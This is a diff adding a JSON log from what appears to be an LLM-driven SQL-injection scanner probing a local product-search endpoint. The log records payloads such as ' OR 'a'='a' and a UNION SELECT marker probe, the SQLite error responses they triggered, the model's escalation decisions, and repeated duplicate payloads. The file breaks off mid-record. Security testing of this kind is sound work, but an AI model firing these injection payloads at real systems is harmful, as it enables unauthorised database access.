@@ -1,0 +1,3336 @@
+{
+  "generated_at": "2026-06-25T17:38:46.459578+00:00",
+  "agent_results_file": "agent_results.json",
+  "confirmed_payload_count": 7,
+  "confirmed_payloads": [
+    {
+      "method": "GET",
+      "url": "http://127.0.0.1:8080/rest/products/search",
+      "path": "/rest/products/search",
+      "endpoint_context": {
+        "endpoint_type": "search",
+        "resource": "product search results",
+        "likely_sql_context": "string_search",
+        "recommended_attack_style": "string_search_error_probe",
+        "avoid_payload_styles": [
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "search endpoint with query parameter"
+      },
+      "target_params": [
+        {
+          "name": "q",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "search",
+            "resource": "product search results",
+            "likely_sql_context": "string_search",
+            "recommended_attack_style": "string_search_error_probe",
+            "avoid_payload_styles": [
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter",
+            "starting_strategy": "string_search_error_probe"
+          },
+          "payload_count": 7,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='a",
+              "payload_rationale": "string_search_error_probe",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2086,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2101,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "read_confirmation",
+              "payload": "UNION SELECT NULL, 'marker'",
+              "payload_rationale": "The payload string must come from your reasoning, not from code constants. Using UNION SELECT with a harmless marker string.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "marker",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2098,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2088,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 984,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='b",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2091,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2085,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": -6,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='c",
+              "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
+              "expected_signal": "SQL parser error with a syntax error message",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2064,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2103,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 39,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='d",
+              "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2066,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2071,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 5,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='e",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2056,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2083,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 27,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='g",
+              "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2087,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 0,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Max attempts reached.",
+          "confirmation_rejections": [
+            {
+              "payload": "UNION SELECT NULL, NULL",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: String/search probe rejected because it lacks a string delimiter."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "String/search probe rejected because it lacks a string delimiter.",
+                "next_step": "Return only a parameter value that includes a quote or double-quote delimiter and a harmless boolean comparison."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            }
+          ]
+        }
+      ],
+      "parameter": "q",
+      "parameter_location": "query",
+      "path_index": null,
+      "original_value": null,
+      "payload": " OR 'a'='a",
+      "payload_rationale": "string_search_error_probe",
+      "expected_signal": "SQL parser error",
+      "observed_signal": "sql_error",
+      "evidence": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> ",
+      "baseline_status": 200,
+      "probe_status": 500
+    },
+    {
+      "method": "GET",
+      "url": "http://127.0.0.1:8080/rest/products/search",
+      "path": "/rest/products/search",
+      "endpoint_context": {
+        "endpoint_type": "search",
+        "resource": "product search results",
+        "likely_sql_context": "string_search",
+        "recommended_attack_style": "string_search_error_probe",
+        "avoid_payload_styles": [
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "search endpoint with query parameter"
+      },
+      "target_params": [
+        {
+          "name": "q",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "search",
+            "resource": "product search results",
+            "likely_sql_context": "string_search",
+            "recommended_attack_style": "string_search_error_probe",
+            "avoid_payload_styles": [
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter",
+            "starting_strategy": "string_search_error_probe"
+          },
+          "payload_count": 7,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='a",
+              "payload_rationale": "string_search_error_probe",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2086,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2101,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "read_confirmation",
+              "payload": "UNION SELECT NULL, 'marker'",
+              "payload_rationale": "The payload string must come from your reasoning, not from code constants. Using UNION SELECT with a harmless marker string.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "marker",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2098,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2088,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 984,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
